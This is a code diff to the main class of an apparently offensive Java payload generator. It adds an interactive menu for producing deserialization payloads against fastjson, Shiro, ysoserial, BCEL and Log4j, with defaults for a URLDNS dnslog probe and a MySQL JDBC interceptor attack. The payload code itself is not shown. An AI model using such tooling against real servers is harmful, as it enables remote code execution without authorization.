@@ -1,15 +1,24 @@
 package com.ding0x0.run;
 
+import com.ding0x0.Generate;
 import com.ding0x0.Payload;
+import com.ding0x0.bootstrap.TypeErrorException;
+import com.ding0x0.fastjson.GenerateFastjsonPayload;
 import com.ding0x0.utils.Code;
+import com.ding0x0.utils.Enums;
 import com.ding0x0.utils.Util;
 import com.ding0x0.yso.Serializer;
 import org.apache.commons.cli.*;
+import org.fusesource.jansi.Ansi;
+import com.ding0x0.utils.Enums.Type;
+import com.ding0x0.utils.Enums.FastjsonType;
+import com.ding0x0.utils.Enums.Args;
 
-import java.util.ArrayList;
-import java.util.LinkedList;
-import java.util.List;
-import java.util.Queue;
+import java.io.IOException;
+import java.lang.reflect.InvocationTargetException;
+import java.util.*;
+
+import static org.fusesource.jansi.Ansi.ansi;
 
 public class App {
     public String help(){
@@ -53,10 +62,10 @@ public class App {
                 "-he\t\t\t\t   html encode\n" +
                 "-raw  \t\t\t   raw echo";
     }
-
-    public static void main(String[] args) throws Exception {
-        new App().run(args);
-    }
+//
+//    public static void main(String[] args) throws Exception {
+//        new App().run(args);
+//    }
 
     public Options init(){
         Options options = new Options();
@@ -95,6 +104,141 @@ public class App {
         options.addOption("un",true,"username(default yso_URLDNS_http://xxx.dnslog.cn)");
         options.addOption("statement", true, "statement(default com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor)");
         return options;
+    }
+
+    public static ArrayList<String> parserArgs(String args, String type) {
+        // 获取到参数数组
+        String[] tmp = args.split(" ");
+        // 用户输入参数
+        ArrayList<String> inputArgs = new ArrayList<String>(Arrays.asList(tmp));
+        // 输出参数列表
+        ArrayList<String> outputArgs = new ArrayList<>();
+        // enum参数列表
+        ArrayList<String> typeArgs = null;
+
+        // 遍历enum获取对应的参数列表
+        for (FastjsonType types :
+                FastjsonType.values()){
+            if (types.name().equals(type)){
+                typeArgs = FastjsonType.get(type);
+                break;
+            }
+        }
+
+        // 检测类型是否正常
+        if (typeArgs == null){
+            throw new TypeErrorException("fastjson类型错误");
+        }
+
+        // 循环设置参数
+        for (String arg :
+                typeArgs ) {
+            int index = inputArgs.indexOf(arg);
+            // 如果找不到用户输入
+            if (index == -1){
+                if (type.equals("jdbc") && arg.equals("-un")){
+                    outputArgs.add("yso_URLDNS_http://xxx.dnslog.cn");
+                }else if (type.equals("jdbc") && arg.equals("-statement")){
+                    outputArgs.add("com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor");
+                }else {
+                    System.out.println(ansi().eraseScreen().fg(Ansi.Color.GREEN).a("参数错误，请查看参数列表").reset().toString());
+                    System.exit(1);
+                }
+            }
+            outputArgs.add(inputArgs.get(index + 1));
+        }
+        return outputArgs;
+    }
+
+    public void run() throws Exception {
+        Scanner scanner = new Scanner(System.in);
+        // 输入参数
+        String type = null;
+        // 判断是否输入过，用来跳过-h后重复输入
+        boolean typeFlag = false;
+        String fastjsonType = null;
+        String args = null;
+        boolean fastjsonTypeFlag = false;
+        boolean argsFlag = false;
+
+        while (true){
+            if (!typeFlag){
+                System.out.println("[+] 选择payload类型 -h查看类型 ");
+                type = scanner.nextLine();
+                typeFlag = true;
+            }
+            if (type.contains("-h")){
+                System.out.println(ansi().eraseScreen().fg(Ansi.Color.GREEN).a(Type.getAll()).reset().toString());
+                continue;
+            }
+
+            // 生成 raw payload
+            Payload object = null;
+            Object rawObj = null;
+
+            switch (type){
+                case "fastjson":
+                    if (!fastjsonTypeFlag){
+                        System.out.println("[+] 选择fastjson payload类型 -h查看类型");
+                        fastjsonType = scanner.nextLine();
+                        fastjsonTypeFlag = true;
+                    }
+                    if (fastjsonType.contains("-h")){
+                        System.out.println(ansi().eraseScreen().fg(Ansi.Color.GREEN).a(FastjsonType.getAll()).reset().toString());
+                        continue;
+                    }
+
+                    if (!argsFlag){
+                        System.out.println("[+] 选择fastjson参数 -h查看选填参数 -hh查看用法");
+                        args = scanner.nextLine();
+                    }
+
+                    if (fastjsonType.contains("-hh")){
+                        System.out.println(ansi().eraseScreen().fg(Ansi.Color.GREEN).a(Args.getHelper()).reset().toString());
+                        continue;
+                    }
+                    if (args.contains("-h")){
+                        System.out.println(ansi().eraseScreen().fg(Ansi.Color.GREEN).a(Args.getAll()).reset().toString());
+                        continue;
+                    }
+                    if (args.length() <2){
+                        System.out.println(ansi().eraseScreen().fg(Ansi.Color.RED).a("参数错误，请查看参数列表").reset().toString());
+                        System.exit(1);
+                    }else {
+                        ArrayList<String> funcArgs = parserArgs(args, fastjsonType);
+                        Generate generate = new GenerateFastjsonPayload(funcArgs, fastjsonType);
+                        object = (Payload) generate.generatePayload();
+                    }
+                    break;
+                case "shiro":
+                    break;
+                case "yso":
+                    break;
+                case "bcel":
+                    break;
+                case "log4j":
+                    break;
+                default:
+                    throw new TypeErrorException("fastjson payload 类型错误");
+            }
+
+            // 编码
+            System.out.println("[+] 选择payload编码类型 默认为raw");
+            String encode = scanner.nextLine();
+            rawObj = object.format();
+            if (encode.trim().equals("")){
+                if (!type.equals("yso")){
+                    System.out.println(ansi().eraseScreen().fg(Ansi.Color.GREEN).a("[*] 生成成功").reset().toString());
+                    System.out.println(ansi().eraseScreen().fg(Ansi.Color.GREEN).a(rawObj).reset().toString());
+                }
+            }
+            break;
+        }
+    }
+
+    public static void main(String[] args) throws Exception {
+        App app = new App();
+        app.run();
     }
 
 
